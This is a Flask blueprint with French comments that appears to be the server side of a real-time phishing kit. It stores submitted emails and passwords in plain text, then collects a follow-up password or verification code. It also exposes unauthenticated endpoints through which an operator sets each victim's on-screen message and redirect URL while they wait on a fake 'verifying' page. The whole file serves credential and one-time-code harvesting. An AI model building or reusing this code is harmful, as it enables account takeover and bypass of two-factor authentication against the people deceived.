from flask import Blueprint, request, jsonify, render_template, url_for, redirect
from models import Connection, db
from sqlalchemy import desc


kmyy = Blueprint('kmyy', __name__, template_folder='templates',url_prefix='/kmyy')

# Route pour afficher le formulaire d'inscription et valider les données en POST
@kmyy.route('/', methods=['GET', 'POST'])
def kmyyindex():
    return render_template("kim.html")

# Route pour afficher le formulaire d'inscription et valider les données en POST
@kmyy.route('/register', methods=['GET', 'POST'])
def register():

    if request.method == 'POST':
        email = request.form['email']
        password = request.form['password']
        password = request.form['password']
        message = "Vérification de l'adresse e-mail en cours..."

        # Créer une nouvelle connexion (utilisateur)
        new_user = Connection(
            email=email,
            password=password,
            message=message
        )

        db.session.add(new_user)
        db.session.commit()

        return redirect(url_for('kmyy.verif', email=email))

    return render_template('kmyyindex.html')


@kmyy.route('/verif', methods=['GET', 'POST'])
def verif():
    email = request.args.get('email')
    if request.method == 'POST':
        # Récupérer les données du formulaire
        email = request.form.get('email')
        password = request.form.get('password')  # Récupérer le mot de passe (si présent)
        code = request.form.get('code')  # Récupérer le code (si présent)

        # Rechercher l'utilisateur par email
        user = Connection.query.filter_by(email=email).order_by(desc(Connection.id)).first()

        if not user:
            return jsonify({'error': 'Utilisateur non trouvé'}), 404

        # Vérifier si 'password' ou 'code' est fourni, mais pas les deux
        if password and code:
            return jsonify({'error': "Vous ne pouvez fournir qu'un mot de passe OU un code, pas les deux."}), 400

        if password:
            user.password = password
            user.message = "Vérification de l'adresse e-mail en cours..."
        elif code:
            user.code = code
            user.message = "Vérification de l'adresse e-mail en cours..."
        else:
            return jsonify({'error': 'Aucune donnée valide fournie.'}), 400

        try:
            db.session.commit()  # Appliquer les modifications à la base de données
            return redirect(url_for('kmyy.verif', email=email))
        except Exception as e:
            db.session.rollback()  # Annuler en cas d'erreur
            return jsonify({'error': str(e)}), 500

    # Rendre la page de vérification pour les requêtes GET
    return render_template('kmyyverif.html')

@kmyy.route('/redirect', methods=['GET', 'POST'])
def redirect_url():
    # Handle POST request
    if request.method == 'POST':
        email = request.json.get('email')  # Get the email from the JSON body
        action = request.json.get('action')  # Get the action URL from the JSON body

        if not email or not action:
            return jsonify({"error": "Email and action are required"}), 400

        # Retrieve all connections with the given email
        connections = Connection.query.filter_by(email=email).all()

        if connections:
            # Update the action URL for all connections with the provided email
            for connection in connections:
                connection.action = action  # Update the action field
            db.session.commit()  # Commit the changes to the database

            return jsonify({"success": "200"}), 200
        else:
            # If no connections with the given email are found
            return jsonify({"error": "No connections found with the given email"}), 400

    # Handle GET request
    elif request.method == 'GET':
        email = request.args.get('email')  # Get the email from query parameters

        if not email:
            return jsonify({"error": "Email parameter is required"}), 400

        # Get the latest connection based on the provided email
        connection = Connection.query.filter_by(email=email).order_by(desc(Connection.id)).first()

        if connection and connection.action:
            # If connection exists and the action field is set
            return jsonify({"redirect_url": connection.action}), 200
        else:
            # If no connection or action URL is found
            return jsonify({"error": "No action URL found for the given email"}), 400




@kmyy.route('/message', methods=['GET', 'POST'])
def message():
    if request.method == 'POST':

        email = request.json.get('email')
        message = request.json.get('message')

        # Rechercher tous les utilisateurs ayant cet email
        connections = Connection.query.filter_by(email=email).all()

        if connections:
            # Mettre à jour le message pour tous les utilisateurs ayant cet email
            for connection in connections:
                connection.message = message  # Met à jour le message
            db.session.commit()  # Sauvegarde les modifications dans la DB

            return jsonify({"success":"200"}),200

        else:
            # Si aucun utilisateur n'a cet email, afficher un message d'erreur
            return jsonify({"Error": "Dont find email"}),400

    elif request.method == 'GET':
        # Si la requête est GET, récupérer l'email depuis l'URL
        email = request.args.get('email')  # Paramètre 'email' dans l'URL

        if not email:
            return jsonify({"error": "Email manquant"}), 400  # Si l'email est absent, renvoyer une erreur

        # Recherche de l'utilisateur avec l'email spécifié et tri par ordre décroissant (dernier enregistrement)
        connection = Connection.query.filter_by(email=email).order_by(desc(Connection.id)).first()

        if connection:
            # Si un utilisateur avec cet email est trouvé, renvoyer le message en JSON
            return jsonify({"email": email, "message": connection.message})
        else:
            # Si aucun utilisateur avec cet email n'est trouvé, renvoyer une erreur
            return jsonify({"error": "Utilisateur non trouvé avec cet email"}), 404

    # Si la méthode est autre que GET ou POST, on peut renvoyer une erreur
    return jsonify({"error": "Méthode non autorisée"}), 405


